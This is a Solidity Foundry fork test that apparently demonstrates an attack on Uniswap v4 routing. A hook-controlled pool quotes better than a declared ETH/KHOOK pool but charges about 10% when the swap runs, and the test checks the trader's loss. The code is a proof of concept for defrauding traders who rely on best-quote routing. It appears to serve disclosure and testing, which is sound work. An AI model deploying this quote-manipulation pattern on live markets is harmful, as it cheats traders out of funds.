// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {QuoteAwareFeeHook} from "../src/demo/QuoteAwareFeeHook.sol";
import {PoolSeeder} from "../src/demo/PoolSeeder.sol";
import {DeployQuoteAwareHook} from "../script/DeployQuoteAwareHook.s.sol";

interface IV4QuoterLike {
    struct QuoteExactSingleParams { PoolKey poolKey; bool zeroForOne; uint128 exactAmount; bytes hookData; }
    function quoteExactInputSingle(QuoteExactSingleParams memory params) external returns (uint256 amountOut, uint256 gasEstimate);
}

interface IUniversalRouterLike {
    function execute(bytes calldata commands, bytes[] calldata inputs, uint256 deadline) external payable;
}

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

/// @notice The demo attack pool on a Sepolia fork, with the live PoolManager, V4Quoter, Universal Router and PoolSeeder:
///         deploy the quote-aware hook at its predicted address, open an ETH/KHOOK dynamic-fee pool at the declared pool's
///         price the way dex's New pool tab does, then quote and swap 0.0005 ETH like dex (V4_SWAP, same calldata shape).
///         Run with FOUNDRY_PROFILE=fork forge test --match-contract QuoteAwareHookFork -vv
contract QuoteAwareHookForkTest is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    IPoolManager constant PM = IPoolManager(0xE03A1074c86CFeDd5C142C4F04F1a1536e203543);
    IV4QuoterLike constant QUOTER = IV4QuoterLike(0x61B3f2011A92d183C7dbaDBdA940a7555Ccf9227);
    IUniversalRouterLike constant ROUTER = IUniversalRouterLike(0x3A9D48AB9751398BbFa63ad67599Bb04e4BdF98b);
    PoolSeeder constant SEEDER = PoolSeeder(0x3F4bE4f833BCcf3b2A4c243f8E6e02762613Fabc);
    address constant KHOOK = 0x4cB41E85e1E16D7de576e2a262fF1b96eE948b96;
    address constant DELTA_FEE_HOOK = 0x8CcDe930348ecA47D39A0104807acb0e16F6c044;
    uint24 constant DYNAMIC_FEE_FLAG = 0x800000;
    uint128 constant AMOUNT_IN = 0.0005 ether;

    PoolKey declared;
    PoolKey attack;

    function setUp() public {
        vm.createSelectFork("sepolia");
        (address hook, bytes32 salt) = new DeployQuoteAwareHook().predict();
        if (hook.code.length == 0) {
            (bool ok,) = CREATE2_FACTORY.call(
                abi.encodePacked(salt, type(QuoteAwareFeeHook).creationCode, abi.encode(address(PM), address(QUOTER), uint24(500), uint24(100_000)))
            );
            require(ok && hook.code.length > 0, "hook deploy failed");
        }
        declared = PoolKey(Currency.wrap(address(0)), Currency.wrap(KHOOK), 3000, 60, IHooks(DELTA_FEE_HOOK));
        attack = PoolKey(Currency.wrap(address(0)), Currency.wrap(KHOOK), DYNAMIC_FEE_FLAG, 60, IHooks(hook));

        // As dex's New pool tab does for this hook: start one tick spacing (60 ticks, ~0.6%) above the declared pool's
        // price, rounded up to the spacing, with one-sided KHOOK liquidity over the 600 ticks below.
        (, int24 tick,,) = PM.getSlot0(declared.toId());
        int24 tickUpper = (tick >= 0 ? ((tick + 59) / 60) * 60 : (tick / 60) * 60) + 60;
        uint256 liquidity = 350_000 ether;
        deal(KHOOK, address(this), liquidity);
        IERC20Like(KHOOK).approve(address(SEEDER), liquidity);
        SEEDER.seed(attack, tickUpper - 600, tickUpper, liquidity);
    }

    function _quote(PoolKey memory key) internal returns (uint256 out) {
        (out,) = QUOTER.quoteExactInputSingle(IV4QuoterLike.QuoteExactSingleParams(key, true, AMOUNT_IN, ""));
    }

    /// @dev Universal Router V4_SWAP: SWAP_EXACT_IN_SINGLE, SETTLE_ALL, TAKE_ALL, as klamp-sdk.mjs buildSwap encodes it.
    function swap(PoolKey memory key, uint256 minOut) external payable returns (uint256 received) {
        bytes memory actions = abi.encodePacked(uint8(0x06), uint8(0x0c), uint8(0x0f));
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(key, true, AMOUNT_IN, uint128(minOut), bytes(""));
        params[1] = abi.encode(key.currency0, uint256(AMOUNT_IN));
        params[2] = abi.encode(key.currency1, minOut);
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);
        uint256 before = IERC20Like(KHOOK).balanceOf(address(this));
        ROUTER.execute{value: AMOUNT_IN}(abi.encodePacked(uint8(0x10)), inputs, block.timestamp + 600);
        received = IERC20Like(KHOOK).balanceOf(address(this)) - before;
    }

    function testAttackPoolWinsTheQuoteAndChargesTenPercent() public {
        uint256 declaredQuote = _quote(declared);
        uint256 attackQuote = _quote(attack);
        console2.log("declared pool quote (KHOOK)", declaredQuote / 1e18);
        console2.log("attack pool quote (KHOOK)  ", attackQuote / 1e18);
        assertGt(attackQuote, declaredQuote, "a best-quote router picks the attack pool");

        // 5% slippage: the swap reverts (the trader loses gas).
        vm.expectRevert();
        this.swap{value: AMOUNT_IN}(attack, attackQuote * 95 / 100);

        // 15% slippage: it executes and pays about 10% less than quoted.
        uint256 received = this.swap{value: AMOUNT_IN}(attack, attackQuote * 85 / 100);
        uint256 lossBps = (attackQuote - received) * 10_000 / attackQuote;
        console2.log("received at 15% slippage   ", received / 1e18);
        console2.log("loss vs quote (bps)        ", lossBps);
        assertApproxEqAbs(lossBps, 995, 15, "loss ~ 10% - 0.05%");
        assertLt(received, declaredQuote, "and less than the declared pool would have paid");
    }

    function testDeclaredPoolPaysItsQuote() public {
        uint256 quoted = _quote(declared);
        uint256 received = this.swap{value: AMOUNT_IN}(declared, quoted * 95 / 100);
        assertEq(received, quoted, "declared pool: quoted = paid");
    }

    receive() external payable {}
}
